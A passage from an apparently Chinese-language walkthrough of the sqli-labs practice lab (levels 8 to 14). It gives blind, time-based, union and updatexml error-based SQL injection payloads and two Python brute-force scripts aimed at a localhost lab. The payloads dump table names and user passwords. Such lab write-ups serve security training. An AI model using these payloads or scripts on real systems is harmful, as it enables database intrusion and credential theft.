database()),<span class="number">8</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">121</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>注意这里的 substr(<code>(select database())</code>,1,1) 第一个参数必须带括号，因为 select 语句返回元组的形式，如果没有括号，则其结果的参数均会作为 <code>substr</code> 的参数代入，从而会报错。</p><p>获取第一个表的长度，并获取表名 emails</p><p><img src="/img/sqli-labs/clip_image001-7997725.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997725.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">101</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)) = 109 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">97</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1)) = 105 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">5</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">108</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)) = 115 --+</span></span><br></pre></td></tr></table></figure><p>获取表数据字段 分别是 2，8</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select length(column_name) from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; limit 0,1) = 2 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;emails&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">8</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997735.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997735.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>获取字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># id</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; limit 0,1),1,1)) = 105 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;emails&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">100</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># email_id</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; limit 1,1),1,1)) = 101 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;emails&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">109</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; limit 1,1),3,1)) = 97 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;emails&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">105</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; limit 1,1),5,1)) = 108 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;emails&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">6</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">95</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; limit 1,1),7,1)) = 105 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;emails&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">8</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">100</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="获取数据-3"><a href="#获取数据-3" class="headerlink" title="获取数据"></a>获取数据</h3><p>查询表的字段个数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(*) from emails) = 8 --+</span></span><br></pre></td></tr></table></figure><p>获取第一个字段数据长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select length(email_id) from emails limit 0,1) = 16 --+</span></span><br></pre></td></tr></table></figure><p>获取第一个字段数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 第一个字段第一个字母是 D</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select email_id from emails limit 0,1),1,1)) = 68 --+</span></span><br></pre></td></tr></table></figure><p>写个脚本获取这个字段所以 16 个字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    url_template = <span class="string">&quot;http://localhost:8890/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</span></span><br><span class="line">    chars = <span class="string">&#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = <span class="built_in">ord</span>(char)</span><br><span class="line">            url = url_template.<span class="built_in">format</span>(i,char_ascii)</span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            length = <span class="built_in">len</span>(response.text)</span><br><span class="line">            <span class="comment">#返回的长度等于 831 就中了</span></span><br><span class="line">            <span class="keyword">if</span> length &gt; <span class="number">830</span>:</span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997751.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997751.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-9-GET-时间盲注"><a href="#Less-9-GET-时间盲注" class="headerlink" title="Less-9 GET 时间盲注"></a>Less-9 GET 时间盲注</h2><p>验证注入点：<code>&#39; and sleep(5) --+</code><br />利用闭合方式：<code>&#39; &lt;payload&gt; --+</code></p><p>无法查看页面返回情景，所以查询语句正确时，需要通过流程控制来判断进行时间延迟输出判断。</p><p>MySQL的 if<br /><code>if(表达式,真,假)</code><br /></p><p><img src="/img/sqli-labs/clip_image001-7997763.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997763.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>利用 and 语句的特性，当有一个为假时，后面不用判断</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &lt;payload&gt; and if(1=1, sleep(5), null) --+</span></span><br></pre></td></tr></table></figure><p>例如猜数据库长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (length(database())) = 8 and if(1=1, sleep(5), null) --+</span></span><br></pre></td></tr></table></figure><p>数据库名第一个字母 s</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select database()),1,1)) = 115 and if(1=1, sleep(5), null) --+</span></span><br></pre></td></tr></table></figure><p>查询表字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(*) from emails) = 7 and if(1=1, sleep(5), null) --+</span></span><br></pre></td></tr></table></figure><p>和 Less-8 获取的数据一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    url_template = <span class="string">&quot;http://localhost:8890/sqli-labs/Less-9/?id=1&#x27; and ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1))=&#123;1&#125; and if(1=1, sleep(5), null) --+&quot;</span></span><br><span class="line">    chars = <span class="string">&#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = <span class="built_in">ord</span>(char)</span><br><span class="line">            url = url_template.<span class="built_in">format</span>(i,char_ascii)</span><br><span class="line">            time_start = time.time()</span><br><span class="line">            _ = requests.get(url)</span><br><span class="line">            time_diff = time.time() - time_start</span><br><span class="line">            <span class="comment"># 返回时间 &gt; 5s</span></span><br><span class="line">            <span class="keyword">if</span> time_diff &gt; <span class="number">5</span>:</span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997774.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997774.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-10-GET-时间盲注"><a href="#Less-10-GET-时间盲注" class="headerlink" title="Less-10 GET 时间盲注"></a>Less-10 GET 时间盲注</h2><p>验证注入点：<code>&quot; and sleep(5) --+</code><br />利用闭合方式：<code>&quot; &lt;payload&gt; --+</code></p><p>获取 Less-8 的数据脚本需要改动的地方：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_template = <span class="string">&quot;http://localhost:8890/sqli-labs/Less-10/?id=1\&quot; and ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1))=&#123;1&#125; and if(1=1, sleep(5), null) --+&quot;</span></span><br></pre></td></tr></table></figure><p>这里在介绍另外一种时间盲注方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if(</span><br><span class="line">    (<span class="keyword">select</span>(substr((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span>&quot;Dumb&quot; LIMIT <span class="number">1</span>), <span class="number">2</span>, <span class="number">1</span>))<span class="operator">=</span>&quot;u&quot;),</span><br><span class="line">    sleep(<span class="number">2</span>),</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>if带括号是函数，不能直接用，所以最开始要拉上个 select</li><li>如果 if 第一个参数不是表达式，要用括号扩起来</li><li>参考自 <a href="https://www.w3resource.com/mysql/control-flow-functions/if-function.php">https://www.w3resource.com/mysql/control-flow-functions/if-function.php</a></li></ul><h2 id="Less-11-POST-注入"><a href="#Less-11-POST-注入" class="headerlink" title="Less-11 POST 注入"></a>Less-11 POST 注入</h2><p>验证注入点：单引号报错，两个单引号闭合<br />利用闭合方式：<code>admin&#39; &lt;payload&gt; #&amp;passwd=1</code></p><p>如果用 <code>admin&#39; -- </code> 注意 <code>--</code> 后面有个空格，或者 <code>--+</code> 也可以，保证HTTP请求包的 Content-Type 是 x-www-form-urlencoded 或Content-Type起到效果类似即可，因为这样包发出时会对POST请求体部分进行url编码。</p><h3 id="获取列数"><a href="#获取列数" class="headerlink" title="获取列数"></a>获取列数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27; order by 2#&amp;passwd=1</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997783.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997783.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="爆破数据-2"><a href="#爆破数据-2" class="headerlink" title="爆破数据"></a>爆破数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 库</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27; and 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata)#&amp;passwd=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 表</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>)#<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"># 字段</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27; and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;)#&amp;passwd=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 数据</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> security.users),(<span class="keyword">select</span> group_concat(password) <span class="keyword">from</span> security.users) #<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997791.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997791.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-12-POST"><a href="#Less-12-POST" class="headerlink" title="Less-12 POST"></a>Less-12 POST</h2><p>验证注入点：双引号报错，两个双引号闭合<br />利用闭合方式：<code>admin&quot;) &lt;payload&gt; #&amp;passwd=1</code></p><p>获取列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin&quot;) order by 2#&amp;passwd=1</span><br></pre></td></tr></table></figure><p>爆破数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 库</span><br><span class="line">uname<span class="operator">=</span>admin&quot;) and 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata)#&amp;passwd=1</span><br><span class="line"></span><br><span class="line"># 表</span><br><span class="line">uname=admin&quot;) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>)#<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"># 字段</span><br><span class="line">uname<span class="operator">=</span>admin&quot;) and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)#&amp;passwd=1</span><br><span class="line"></span><br><span class="line"># 数据</span><br><span class="line">uname=admin&quot;) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> security.users),(<span class="keyword">select</span> group_concat(password) <span class="keyword">from</span> security.users) #<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997799.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997799.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-13-POST-报错注入"><a href="#Less-13-POST-报错注入" class="headerlink" title="Less-13 POST 报错注入"></a>Less-13 POST 报错注入</h2><p>验证注入点：单引号报错，两个单引号闭合<br />利用闭合方式：<code>uname=admin&#39;) &lt;payload&gt; #&amp;passwd=1</code></p><p>获取数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;) and updatexml(1,concat(0x7e,(select database()),0x7e),1) #&amp;passwd=1</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997804.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997804.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 表</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),1) #&amp;passwd=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 字段</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span>) <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span></span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;) and updatexml(1,concat(0x7e,(select concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 4,1),0x7e),1) #&amp;passwd=1</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span>) <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">5</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"># 数据</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;) and updatexml(1,concat(0x7e,(select concat(id,username,password) from users limit 0,1),0x7e),1) #&amp;passwd=1</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997811.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997811.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-14-POST-报错注入"><a href="#Less-14-POST-报错注入" class="headerlink" title="Less-14 POST 报错注入"></a>Less-14 POST 报错注入</h2><p>验证注入点：双引号报错，两个双引号闭合<br />利用闭合方式：<code>uname=admin&quot; &lt;payload&gt; #&amp;passwd=1</code></p><p>获取数据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&quot; and updatexml(1,concat(0x7e,(select concat(id,username,password) from users limit 0,1),0x7e),1) #&amp;passwd=1</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997818.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997818.png" 